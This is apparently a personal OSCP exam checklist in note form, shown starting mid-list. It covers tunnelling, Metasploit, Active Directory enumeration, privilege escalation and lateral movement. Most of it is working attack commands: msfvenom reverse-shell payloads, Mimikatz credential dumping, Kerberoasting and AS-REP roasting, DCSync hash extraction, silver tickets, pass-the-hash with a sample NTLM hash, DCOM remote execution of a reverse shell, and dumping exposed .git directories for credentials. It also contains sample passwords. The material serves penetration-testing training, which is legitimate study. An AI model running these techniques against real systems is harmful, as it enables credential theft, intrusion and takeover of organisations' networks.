	- [ ] Do any jobs utilize a wildcard (\*)

---

# Tunneling
Are there any internal networks connected to the boxes you gain access to?
- [ ] `ip addr`
- [ ] `ip route`
- Come back to this

## Ligolo
1. [[File Transfer Methods|Move]] your [[Ligolo-ng (& GO)|Ligolo]] agent to the target box however possible, ensuring that you are moving the correct agent respective to the target OS
2. On your kali, run `sudo ./ligolo-proxy -selfcert`. Always use **sudo**!
3. Back on the target, run the agent with `./ligolo-agent-win.exe -connect <kali_IP>:11601 -ignore-cert`
4. This should work, you should see a connection on your Ligolo client.

In your client, run `session` and then run `ifconfig` to see your interfaces. Smack that MF `autoroute` and tunnel away baby.
- When running ifconfig, the internal

> [!Warning] If [[Ligolo-ng (& GO)|Ligolo]] tells you error: unable to start tunnel: file exists;
>You can run `ip -br a` and then run `sudo ip link delete <tunnel-interface-name>` to manually eliminate the broken tunnels. Then, try `autoroute` again.

### Internal IP
Note that when you run `ifconfig` in Ligolo, you are given and need to use the **internal IP address** if/when you have to call back from the NEXT box to your Kali.

If you're on *target_2* via tunnel and you can't hit your Kali box, you will need to add a listener to forward you traffic backwards from *target_2* to *target_1* to Kali:
```
listener_add --addr 0.0.0.0:5555 --to 192.168.45.218:5555

OR

listener_add --addr 10.10.101.147:5555 --to 192.168.45.218:5555
```
- **--addr** specifies the internal IP of *target_1* or 0.0.0.0 (internal & external  *target_1*)
- **--to** specifies my Kali address
- The ports are on different machines, so you can make them the same if you want, otherwise they can be whatever you want

All traffic sent from *target_2* that is sent to the **internal IP of target_1 @ 5555** will be forwarded back to your Kali on port 5555. You will probably end up needing to add multiple listeners for shells/HTTP servers etc

> [!Danger] Reverse Shells
> Any reverse shell you make needs to target the **internal IP** of the middle machine - not your Kali. Everything going backwards has to go through the internal network - thus in this example, a reverse shell needs to target the port opened by the listener you attached to the internal network of the machine with the **agent** on it.
- We can't hit Kali without going through the internal network
- Reverse shell should thus target *target_1* so that when you execute it on *target_2*, it goes back to *target_1* and then redirects that traffic to the open listener port on your *kali*



---

# Metasploit / Msfvenom

> [!Danger] You can only use a meterpreter/multi-handler shell **ONE TIME** on the exam ! ! ! 

- [ ] What vulnerabilities are present on / against the box you want to target? If [[NMAP]] reveals them to you, search for the exploit in [[Metasploit]] and then `use` it, filling out required information with `set` and `unset` under `show options`. Determine the payload you want to use, then `run` the attack.
- [ ] Can you use any of the [[Reverse Shell|bind or reverse shells]] or other payloads built into [[msfvenom]] to gain a foothold on a target? 
	- [ ] Remember you can list all payloads with `msfvenom -l payloads` and filter moreso with something like `msfvenom -l payloads --platform windows --arch x64`
- [ ] Upgrade your low-tier shells to some kind of [[msfvenom]] **bind** or reverse **shell** whenever you are able to like `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.169 LPORT=5555 -f exe > revshell.exe`

Meterpreter:
- Use `get system`



---
# Active Directory

## Enumeration
Typically you can identify a domain controller with open ports for [[LDAP - 389]] and `DC` in the name.
- [ ] Use [[net.exe]] commands to enumerate the domain. For more commands, view [[AD Enumeration|this note]]:
	- [ ] `net user /domain` lists domain **users**
	- [ ] `net user <user_name> /domain` searches for specified user info (if a user is within group *Domain Admins*, perhaps you can target them)
	- [ ] `net group /domain` lists all groups within the domain
	- [ ] `net group "<group_name"> /domain` searches for users within specified group

### ADSI Search
Kirch says this command will print out a ton of information if you are on a Windows box within a domain and have PowerShell access. Super valuable if your context sucks and you don't have real user access to run something like [[Netexec]]:
```Powershell
([adsisearcher]"objectcategory=computer").findall()
```

### LDAP Query Targets
Run this against the target domain user with [netexec](https://www.netexec.wiki/ldap-protocol/read-dacl-right)
```
nxc ldap 10.10.93.140 -u eric.wallows -p EricLikesRunning800 -M daclread -o PRINCIPAL=joe TARGET=tom_admin
```

- [ ] See **all groups** in the domain with `nxc ldap <dc-ip> -u <username> -p <password> --groups`
- [ ] Enumerate **all members of a specific group** in the domain with `nxc smb <dc-ip> -u <username> -p <password> --groups "Domain Admins"`


### PowerView
Use [[PowerView]] if you can move it onto the target system to enumerate the domain. Reference [[AD Enumeration|this note ]]or the [[PowerView|PowerView note]] itself, OR the [official documentation](https://powersploit.readthedocs.io/en/latest/Recon/).
#### Setup
- [ ] [[File Transfer Methods|Move]] the [[PowerView|PowerView.ps1]] script over to the target box
- [ ] Run `Set-ExecutionPolicy -scope CurrentUser bypass` AND / OR `Set-ExecutionPolicy Bypass -Scope Process -Force`
- [ ] Run `Import-Module .\PowerView.ps1` from the directory it lands in

#### Commands
- [ ] `Get-NetDomain` prints basic domain info
	- [ ] Locate **PdcRoleOwner** - this identifies the *primary domain controller* in the domain
- [ ] List users and all attributes in the domain with`Get-NetUser` 
- [ ] `Get-NetUser | select cn,pwdlastreset,lastlogon` etc
- [ ] Grab group info with `Get-NetGroup` 
- [ ] Check if your current user has admin rights on any of the machines in the domain with `Find-LocalAdminAccess` 
- [ ] Show users logged into the domain on specified host with`Get-NetSession -ComputerName <hostname> -Verbose` 

#### IIS_Services
See if there are any *Service Principal Accounts* available, which may have upgraded privileges:
- [ ] Query the domain with `Get-NetUser -SPN | select samaccountname,serviceprincipalname` and check for **iis_service**
	- [ ] If there is an **iis_service** account, see if you can resolve its *serviceprincipalname* with `nslookup.exe <serviceprincipalname_domain_name i.e "web04.corp.com">`
		- [ ] Are you given a new IP you can browse to and enumerate, potentially a webpage worth investigating?
- [ ] If you don't have [[PowerView]], you can try the same thing as above with `setspn -L iis_service`

#### ACLs
Enumerate ACLs for the following properties using [[PowerView#Access Control Lists|PowerView]], *especially* **GenericAll**. These properties will be visible in the `ActiveDirectoryRights` field when enumerating:

| Permission Type / Right    | Description                          |
| -------------------------- | ------------------------------------ |
| **GenericAll**             | Full permissions on object           |
| **GenericWrite**           | Edit certain attributes on an object |
| **WriteOwner**             | Change ownership of the object       |
| **WriteDACL**              | Edit ACE's applied to the object     |
| **AllExtendedRights**      | Change password, reset password, etc |
| **ForceChangePassword**    | Password change for the object       |
| **Self (Self-Membership)** | Add ourselves to an example group    |

- [ ] Check **rights** on a username, group, or anything with `Get-ObjectAcl -Identity <object, username, etc>`
- [ ] Run this to check the rights `Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`
	- Change "*Management Department*" to whatever you're querying, like a specific group. Are any of the **rights** above output? If so...
	  - [ ]  You will then need to pipe the output to `Convert-SidToName` to understand what SIDs have the desired rights. Demarcate with a comma ( **,** ) and enclose each object in quotes ( **" "** ) to be safe, as done [[AD Enumeration#Get-ObjectACL Advanced|here]].
	  - [ ] If something here can be abused, do so

#### Domain Shares
- [ ] Run `nxc smb <ip> -u <user> -p <'password'> --shares` to see what permissions your user has on domain shares
- [ ] Run `Find-DomainShare` to see what shares are available across the domain
- [ ] Run `Find-DomainShare -CheckShareAccess` to see which shares we have permission to access
	- [ ] Investigate custom shares with `ls \\<hostname>\share`
	- [ ] Investigate the **SYSVOL** share with `ls \\<dc2.domain.com>\sysvol\domain.com` - it may contain files with password, policies, etc that we can abuse
		- [ ] If you see one containing an encrypted password, you may be able to decrypt it with kali's native `gpp-decrypt "<encrypted_passwd>`

### Blood/SharpHound
You can use SharpHound and BloodHound to collect and process the AD environment as detailed in [[SharpHound & BloodHound|this note]].

Locate the **.ps1** or **.exe** of **SharpHound** and [[SharpHound & BloodHound#SharpHound|transfer it]] to the target
- [ ] Open PowerShell and `cd` into where it's placed on the target system
- [ ] Run `powershell -ep bypass` or `Set-ExecutionPolicy -scope CurrentUser bypass` AND / OR `Set-ExecutionPolicy Bypass -Scope Process -Force`, then:
	- [ ] Run `Import-Module .\Sharphound.ps1`
	- [ ] Run the command `Invoke-BloodHound -CollectionMethod All -OutputDirectory <C:\Desired\Output\Directory\> -OutputPrefix "audit"` to make a collection
	- [ ] Use [[Impacket]] SMB server to [[Impacket#smbserver|transfer the files to your Kali]]

> [!Warning] **Evil-WinRM** Double Hop Issue
> You can visit [this link here](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-double-hop-problem.html) to understand the issue and workarounds, but ultimately you may run into issues trying to use any of the powershell scripts that need to be imported within Evil-WinRM (like *sharphound.ps1*, *PowerView.ps1*, *adPEAS.ps1, etc*. You can always **run them via a reverse shell, SSH** or an alternative. 

- [ ] Start BloodHound with the following commands:
	- [ ] `cd /opt/bloodhound`
	- [ ] `sudo  docker-compose up`
	- [ ] Open `localhost:8118` in browser, login with `admin :: 1qaz2wsx!QAZ@WSX`
	- [ ] Run some queries and enumerate - especially utilizing [[SharpHound & BloodHound#Cypher|Cypher]] - see what objects have weak permissions and may enable you to priv esc within the domain
		- [ ] Select **Cypher** -> **the folder icon**

### adPEAS.ps1
You can upload adPEAS.ps1 to the target and use it to enumerate the domain. To run it, you need to do the following:
- [ ] `Import-Module \adPEAS.ps1` or `. .\adPEAS.ps1`
- [ ] Run with `Invoke-adPEAS`


---
## Privilege Escalation

> [!Warning] For any credentials you crack or passwords you find...
> Store them in a passwords text file. You may need to [[Master Checklist#Abusing Cached Credentials Spraying / Accounts|spray]] them for the available accounts. Do not brute force passwords in AD!

### [[Abusing Cached Credentials|Spraying]] / Accounts
- [ ] If we have access to a domain joined box via [[RDP - 3389|xfreerdp3]], [[File Transfer Methods|move]] [[mimikatz]] onto the box and steal whatever hashes are available to us:
	- [ ] Execute mimikatz from the directory you place it in with `.\mimikatz.exe`, upgrade privileges with `privilege::debug` and then run `sekurlsa::logonpasswords` AND `lsadump::sam`
	- [ ] Use the account **NTLM** hashes to enumerate further
	- [ ] Check all around the systems for credentials. Add them to a list for future [[Abusing Cached Credentials#Password Spraying Attacks|spraying]] 
	    - **Before** [[Abusing Cached Credentials#Password Spraying Attacks|spraying]], use `net accounts` to check the password policy
- [ ] Spray any found credentials with [[Netexec]] for all available users with `nxc smb <ip> -u user1 user2 -p <'password'> --continue-on-success` 
	- [ ] Swap the protocol from `smb` to `ldap` for the DC when you've identified it. Use `smb` everywhere else
	- [ ] You can also use password and user files like so: `nxc smb <ip> -u userfile.txt -p  passfile.txt --continue-on-success`
	- [ ] To spray and attempt via **local logon**, use `nxc smb <ip> -u userfile.txt -p  passfile.txt --local-auth
- [ ] For each user that you obtain credentials for, check if they are administrators on any of the boxes in the domain by running `nxc smb <ip> -u user1 -p <'password'>`
- [ ] Obtain an entire list of domain users with `nxc ldap <DC_IP> -u '<user>' -p '<password>' --users`


### ASREP Roasting
- [ ] If we have the **IP address of the DC** and a set of **valid credentials** to a box in the domain, use impacket to see if you can [[AS-REP Roasting#From Kali|steal credentials with impacket]]:
	- [ ] `impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile <output_file_name> <domain.com/username>`
	- [ ] **Store and [[Hashcat|crack]]** any retrieved account hashes. Any creds return indicate vulnerable accounts that lack the Kerberos preauthentication requirement (likely use **-m 18200**)
	    - Store and abuse these credentials
	- [ ] Can also use [[John the Ripper]] with `john <hashfile>`

	- [ ] You can identify vulnerable users quickly with `impacket-GetNPUsers -dc-ip <dc_ip> <domain.com/username>`

### Kerberoasting
Do you have any domain credentials at all? If so;
- [ ] Use `sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain.com/username>` to see if you can [[Kerberoasting#From Kali|steal TGS-REP hashes]]
	- [ ] Crack any resulting hashes with [[hashcat]] (likely use **-m 13100**)
		- Store and abuse these credentials
	- [ ] Can also use [[John the Ripper]] with `john <hashfile>`

### Silver Ticket
- [ ] Have you identified any strange user service accounts (like *iis_service*) that might have access to [[Silver Ticket|special/secret resources]]? 
	- [ ] Use [[mimikatz]] to dump the hash of the account after [[File Transfer Methods|moving it onto the target]]
	      1. `privilege::debug`
	      2. `sekurlsa::logonpasswords`
	      3. Grab the **NTLM hash** of the service/account
	- [ ] Obtain the [[Silver Ticket#2. Domain SID|domain SID]] of your current user with `whoami /user` - **remove the RID**
	- [ ] Find the target SPN you want to access (internal web server, share, etc - get the resource name like `HTTP/web04.corp.com:80`)
	- [ ] [[Silver Ticket#Creating the Silver Ticket|Create a silver ticket]] within [[Mimikatz]] like so: `kerberos::golden /sid:<SID> /domain:<domain.com> /ptt /target:<website/target_service> /service:<protocol, like http> /rc4:<NTLM_hash> /user:<your_user`
		- [ ] Close [[Mimikatz]], open PowerShell and run `klist`. You should now be able to access the resource.

### DCSync
If an accessible account has one of the following rights:
- *Replicating Directory Changes*
- *Replicating Directory Changes All*
- *Replicating Directory Changes in Filtered Set*
Or are apart of **Domain Admins**, **Enterprise Admins**, or **Administrators**, we may be able to impersonate a DC with their account.
- [ ] Run `impacket-secretsdump -just-dc-user <target_user> <domain.com/user>:'password'@<target_IP>`
      - Note that `user:password` are credentials you must have beforehand
	- [ ] Run this against available users across the IPs in the domain, see if you can grab their credentials this way. **ENSURE** you only utilize the last section of the credentials between the **:** and the **:::** - only that section is the NTLM hash
	- [ ] Crack the hash with [[hashcat]] (likely **-m 1000**)
	- [ ] Store and abuse the credentials you have 

---
## Lateral Movement

### Evil-WinRM
- [ ] Are ports **5985** & **5986** open on any of the machines? You can `nmap -p5985,5986 <target_IP>` to check
	- [ ] You can use [[evil-winrm]] to laterally move using `evil-winrm -i <target_ip> -u <username> -p <password>`
		- [ ] You can [[evil-winrm#NTLM Pass the Hash Attack Login|pass the hash]] if you've obtained an NTLM hash for a user, or if you just don't want to spend time cracking it by replacing the `-p <password>` with `-H <hash>`

### PsExec
Do we have access to a user that is part of the **local administrators group** one *TARGET-1* and  **RDP** access to *TARGET-2*?
- [ ] [[File Transfer Methods|Move]] [[PsExec|PsExec64.exe]] to *TARGET-1*
- [ ] Execute with `.\PsExec64.exe -i  \\TARGET-2_hostname -u [ domain_name\username ] -p [ password ] cmd`
	- This should open a **cmd** prompt on *TARGET-2* remotely as the user specified
	- See [[Lateral Movement#PsExec|this note]] for more help. You may be able to substitue the hostname with an IP
- [ ] You can also pass the hash with [[Impacket#psexec|impacket-psexec]] with `impacket-psexec -hashes <NTLM-hash> <username>@<target-ip>` 

### Pass the Hash
Is port **445** opened on a target, or is **SMB** running on a *different* port?
- Do we have access to a **local admin** for the target and an **NTLM hash** for them?
- [ ] Use `impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73` or something like it to laterally move to *TARGET-
	- See [[Lateral Movement#Pass the Hash|this note]] for more info

### Pass the Ticket
Is there a share or resource our current user doesn't have access to in the domain?
- [ ] [[File Transfer Methods|Move]] [[Mimikatz]] over to TARGET-1
- [ ] Run **cmd** as an admin
- [ ] `privilege::debug
- [ ] `sekurlsa::tickets /export``
	- [ ] **.kirbi** files should now be dropped into wherever Mimikatz was run from. Check them with `dir *.kirbi`
	- [ ] Pick any **TGS** that looks like it has access to the target resource
	- [ ] Inject it into Mimikatz with `kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
		- The ticket should look like the above, starting with `[`... and ending with ....`.kirbi`
	- [ ] Open a PowerShell window and run `klist`, you should now have access to the resource

### DCOM
This is confusing and seems difficult to an idiot like me, but basically:
- [ ] In a PowerShell window, establish the variable *\$dcom* like so: `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","[_TARGET_IP_GOES_HERE_]"))`
	- Put the target IP where indicated above
- [ ] Run this `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"[_PUT_REVERSE_SHELL_HERE}","7")`, except paste a [[Reverse Shell]] 
	- [ ] Start a listener on your Kali (`nc -lnvp 4444`), then run the above command

### Golden Ticket
See [[Golden Ticket|note]] 



### Shadow Copies
See [[Shadow Copies|note]]



---

# Advice
1. Know how to mount Linux drives / hacktrix nfs drive/share
2. Check out [lazagne](https://github.com/AlessandroZ/LaZagne)
3. Make sure when you get on the box use NETSTAT! There may be ports inside the machine that you can't see from the outside 
	1. Ligolo wiki - you can use it to target localhost with some special IP to access the localhost on the TARGET box
4. Kerbrute / LDAPsearch - good if you can enumerate the DC
5. CTRL+F for "password", keep the simple things in mind
6. Busybox - netcat reverse shell type thing. If you use revshells website, you can see how to use it. Also check out ponyshell
7. Check wifi mouse / minimouse thing, if there is an exploit for it - you may need to add a reverse shell to it
8. Include xp_cmdshell

---

# EXTRA:
- Check this guys [last minute checklist out](https://hackwithmike.gitbook.io/oscp/methodology/oscp-last-minute-tips#tab-git)
#### Git
The `.git` directory is a gold mine if you found it via directory busting. Some wordlists may miss it, so make sure you run multiple wordlists and tools.

- Use [git-dumper](https://github.com/arthaud/git-dumper) to dump the `.git` directory (Amazing tool).
- Suppose the .git directory is located at `example.com/.git/`:

```
git-dumper http://example.com ./output_folder
```

- Read through the source codes to look for hard-coded credentials, session tokens, or vulnerable codes such as LFI & SQL injections.
    
- Use `git show` and `git diff` to look for commit changes. There may be credentials that were deleted, but were logged in the commit changes.

---
#### SQL
- Pay attention to the SQL service in use, as different SQL services have different syntaxes.
    - For example, commenting out is `-- -` in MSSQL, but `-- //` in MySQL.